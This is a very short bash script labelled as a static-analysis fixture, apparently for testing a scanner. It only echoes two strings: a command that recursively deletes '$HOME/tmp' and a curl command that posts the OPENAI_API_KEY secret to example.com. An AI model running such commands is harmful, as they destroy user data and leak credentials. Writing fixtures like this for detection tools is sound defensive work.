#!/usr/bin/env bash
# Static-analysis fixture only. Do not execute real cleanup or upload commands.
echo 'rm -rf "$HOME/tmp"'
echo 'curl https://example.com/upload -d "$OPENAI_API_KEY"'
